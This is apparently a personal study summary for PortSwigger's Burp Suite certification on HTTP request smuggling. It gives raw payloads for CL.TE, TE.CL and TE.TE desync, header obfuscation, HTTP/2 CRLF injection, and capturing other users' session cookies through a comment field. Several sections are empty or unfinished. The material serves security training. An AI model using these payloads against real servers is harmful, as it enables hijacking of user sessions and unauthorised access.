##### PortSwigger BurpSuite Certification Summary
# HTTP Request Smuggling
Here the goal is to craft a request which contains a malicious part which is interpreted differently by the front-end system than by the back-end. With this ambiguity of where the border between requests lies it is possible to make an attacker crafted request be part of the one from a legitimate user.
![[smuggling-http-request-to-back-end-server.svg]]
There are two ways by which the beginning and the end of a request is specified:
* Content-Length:
	  It simply states the length of the message
	  ```
	  POST /search HTTP/1.1
	  Host: normal-website.com
	  Content-Type: application/x-www-form-urlencoded
	  Content-Length: 11

	  q=smuggling
* Transfer-Encoding:
    This indicates that chunked encodings are used. Each chunk of data is specified by it's length separately and the end of all blocks is encoded as a chunk of size zero
    ```
    POST /search HTTP/1.1
	Host: normal-website.com
	Content-Type: application/x-www-form-urlencoded
	Transfer-Encoding: chunked

	b
	q=smuggling
	0
    ```

Generally, the Transfer-Encoding header should be considered first and the Content-Length ignored. But even with only the Transfer-Encoding regarded, ther can still be discrepancies:
* Some systems do not support the Transfer-Encoding header
* Some systems do not process it when it is obfuscated in some way

## CL.TE
**Front-End:    Content-Length**
**Back-End:    Transfer-Encoding**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 6
Transfer-Encoding: chunked

0

x
```
#### Reconnaissance
The most straight forward way is to send a request that causes a time delay, because the backend is waiting for the next chunk:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

One way to get a reaction to a successful request smuggling is to cause a 404 Error:
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x

```

The next request will then produce a 404 statuscode, indicating that the attack worked.

## TE.CL
**Front-End:    Transfer-Encoding**
**Back-End:    Content-Length**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

```
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
\r\n
5a\r\n
GPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 12\r\n
\r\n
x\r\n
0\r\n
\r\n

```
It is important to get everything right:
* 1st Content-Length should point past the 5a before the GPOST
* 5a reflect the chunk length in hex, starting from GPOST up to 0
* 2nd Content-Length should point to the end of the whole request

#### Reconnaissance
Again a time delay is utilized, but this time from the backend which consideres the content length. Since the frontend system ommits the X, the backend receives a shorter content than expected and thus waits for the rest.
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X

```

A 404 Error can be produced with:
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0

```

## TE.TE
Since in this scenario both systems consider the Transport-Encoding header, one of them needs to be obfuscated so it will be treated differently by one system:
```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

This string is universal for a TE in back-end:
```
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
--obfuscated TE here--

57
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

0


```

##### Special cases
**The Host header cannot appear twice**

This happens, because the second request appends it's headers to the smuggled ones, which usually states a Host header already. The solution is to have the header in the body instead, so they won't be considered as headers at all.
```
POST ...
Host: ...
Transfer-Encoding: chunked
Content-Length: 47

0

GET /admin HTTP/1.1
Host: localhost

x=

```

## Front-End Request Rewriting
It is significant to know if any rewriting of the request takes place at the front-end, as the back-end might not handle the smuggled request correctly if there is something amiss. The method to reveal any information that is added by the front-end is to perform a POST request which reflect the user input in the response in some way. This field is then used to show what the front-end appended to the request.

```
POST / HTTP/1.1
Host: VICTIM-HOST
Content-Length: 130
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: VICTIM-HOST
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```

The front-end code will then be visible in the search term, such as:
```
...
search=POST / HTTP/1.1
Host: VICTIM-HOST
X-Frwd-To: 172.10.10.10
...
```
revealing a custom header in this case. The attack can then be launched as usual, using the correct headers.

## Capture User Requests
It is possible to craft a smuggle request which reveals other users' data if done right. The key is to make the user request be appended to the smuggle request, which in return stores this data somewhere the attacker can retrieve it, such as a commenting functionality.

It is noteworthy that the parameter used to store the user data has to appear last in the smuggle request and that the data will only be stored until the delimited (`&`).

```
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 324

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=xxx&postId=2&name=carlos&comment=
```
which will end up as:
```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=xxx&postId=2&name=carlos&comment=GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
... 
```
storing the other user's session cookie as a comment.

The content length of the smuggled request has to be adapted to get the whole information or to not cause a timeout. In the labs, it is recommended to send the smuggling request once and then try to access the comment. If it does not work, repeat those two steps the same way.

## H2.CT
## H2.TE
## H2 CLRF Injection
Even when there is validation on `content-length` or `transfer-encoding`, it can sometimes be circumvented by injecting it into an arbitrary header:
```
Foo: bar\r\nTransfer-Encoding: chunked
```
The front-end system which uses HTTP/2 does not understand that there is a newline character followed by another header and thus just sends everything as is to the back-end. The back-end which runs with HTTP/1 will read this header as two separate ones, creating:
```
Foo: bar
Transfer-Encoding: chunked
```

The whole attack could look something like this then:
```
POST / HTTP/2
Host: ac911fac1f5ce3cfc0aad76700b8000b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Foo: bar\r\nTransfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac911fac1f5ce3cfc0aad76700b8000b.web-security-academy.net
Cookie: session=HG68MFOOmXSmX1Hbj3sLva7bjNvCTZk1
Content-Length: 850

csrf=sen76c8yMdE7ObsTvuWBOpMfeWi7rW2M&postId=9&name=a&email=a@asdf.com&website=&comment=


```

## Response Queue Poisoning
stuff

Three criteria must be met for the attack to work:
* The TCP connection between front- and back-end server is reused
* The attacker is able to smuggle in a complete, standalone request that receives its own distinct response
* The servers do not close the TCP connection upon receiving an invalid request

